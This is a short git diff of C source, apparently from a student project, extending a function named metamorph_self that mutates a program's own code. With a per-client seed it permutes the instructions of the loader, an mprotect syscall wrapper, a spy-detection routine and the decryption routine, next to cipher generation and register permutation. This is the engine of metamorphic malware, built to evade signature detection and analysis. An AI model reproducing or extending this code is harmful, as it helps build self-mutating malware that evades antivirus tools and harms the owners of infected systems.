@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2020/01/04 19:49:13 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/01/05 16:01:33 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,12 +26,22 @@ bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id)
 	uint64_t	unique_seed = polymorphic_seed_engine(son_seed, client_id);
 	size_t		cypher_size = (size_t)cypher_end - (size_t)cypher;
 	size_t		loader_size = loader_exit - loader_entry;
+	size_t		wrap_mprotect_size = wrap_mprotect_end - wrap_mprotect;
+	size_t		detect_spy_size = (size_t)detect_spy_end - (size_t)detect_spy;
 
 	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
 	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
+	// loader permutations
 	|| !permutate_instructions(loader_entry, unique_seed, loader_size)
 	|| !permutate_registers(loader_entry, unique_seed, loader_size)
-	|| !true) // add more metamorphosis above!
+	// wrap_mprotect permutations (can't do reg because syscall calling conventions)
+	|| !permutate_instructions(wrap_mprotect, unique_seed, wrap_mprotect_size)
+	// detect_spy permutations (can't do reg because syscall calling conventions)
+	|| !permutate_instructions(detect_spy, unique_seed, detect_spy_size)
+	// decypher permutations (can't do reg because calling conventions)
+	|| !permutate_instructions(decypher, unique_seed, cypher_size)
+	// add more metamorphosis above!
+	|| !true)
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
 	return true;
